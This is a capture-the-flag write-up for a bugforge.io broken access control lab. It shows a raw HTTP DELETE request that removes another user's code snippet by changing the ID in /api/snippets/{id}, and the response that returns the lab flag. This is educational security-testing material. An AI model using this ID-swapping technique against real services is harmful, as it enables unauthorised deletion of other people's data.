---
title: "Copypasta Broken Access Control"
date: 2025-12-8
author: Shawn Szczepkowski
---

In todays lab we are covering the Copypasta Broken Access Control lab from [bugforge.io](https://bugforge.io). This is an easy rated lab.

While exploring the functionality of the lab we see we have the ability to delete code snippets that we have created with a DELETE request sent to `/api/snippets/{snippet number}`. A logical thing to do when testing an application like this would be to see if we can possibly delete another users snippet.

We see our DELETE request to remove our own snippet is to `/api/snippets/8` so let's see what happens if we try to DELETE `/api/snippets/1`.

```sh
DELETE /api/snippets/1 HTTP/2
Host: d75d994a5bd3.labs.bugforge.io
Sec-Ch-Ua-Platform: "Linux"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NSwidXNlcm5hbWUiOiJ0ZXN0IiwiaWF0IjoxNzY1MjAzODU4fQ.eOj4Giqu2-38vo6U_yEA9gQR_jOioPTYPz1f9YyvfAM
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Origin: https://d75d994a5bd3.labs.bugforge.io
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://d75d994a5bd3.labs.bugforge.io/
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
```

We can in fact delete other users snippets and we retrieve our flag.
```sh
HTTP/2 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
Date: Mon, 08 Dec 2025 14:26:14 GMT
Etag: W/"59-PwyHIyIvqrFijQZ4Uw0WFEwTW+A"
X-Powered-By: Express
Content-Length: 89

{
	"message":"Snippet deleted successfully",
	"flag":"bug{582c41bf3f42e60b340dd3efe45dc5dc}"
}
```
